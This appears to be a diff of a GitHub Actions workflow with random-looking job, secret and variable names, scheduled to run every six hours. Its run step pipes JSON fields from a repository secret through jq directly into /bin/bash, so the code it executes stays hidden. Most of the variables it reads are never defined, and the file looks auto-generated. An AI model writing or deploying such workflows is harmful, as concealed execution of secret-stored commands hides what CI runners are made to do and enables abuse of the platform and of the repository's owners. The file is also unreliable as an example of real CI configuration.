@@ -2,8 +2,9 @@ name: qiwussq
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 3/6 * * *'
-jobs:  # 12634
+    - cron: '26 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,11 +12,18 @@ jobs:  # 12634
       - uses: actions/checkout@v4
       - name: qiwussq
         env:
-          cbz3776: ${{ secrets.cbz3776 }}
+          yyseh07: ${{ secrets.yyseh07 }}
         run: |
-          echo $cbz3776 | jq -r .qpiw79 | /bin/bash
-          echo $pe0792 | jq -r .wfpbi29455 | /bin/bash
-          echo $x6 | jq -r .cxi4 | /bin/bash
-          echo $lj225 | jq -r .ed1 | /bin/bash
-          echo $dvauh119 | jq -r .jmg5863 | /bin/bash
+          echo $yyseh07 | jq -r .rvo1 | /bin/bash
+          echo $pnag2 | jq -r .kebe97 | /bin/bash
+          echo $l93 | jq -r .z3950 | /bin/bash
+          echo $zn079 | jq -r .vmi94 | /bin/bash
+          echo $ger1 | jq -r .d057 | /bin/bash
+          echo $l594 | jq -r .q60702 | /bin/bash
+          echo $fmd8 | jq -r .bpaf29 | /bin/bash
+          echo $zpfgi51483 | jq -r .evjyn08457 | /bin/bash
+          echo $rqz72158 | jq -r .smaf08 | /bin/bash
+          echo $b71 | jq -r .tuer95571 | /bin/bash
+          echo $nls25 | jq -r .k947 | /bin/bash
+          echo $ah1387 | jq -r .r1941 | /bin/bash
 
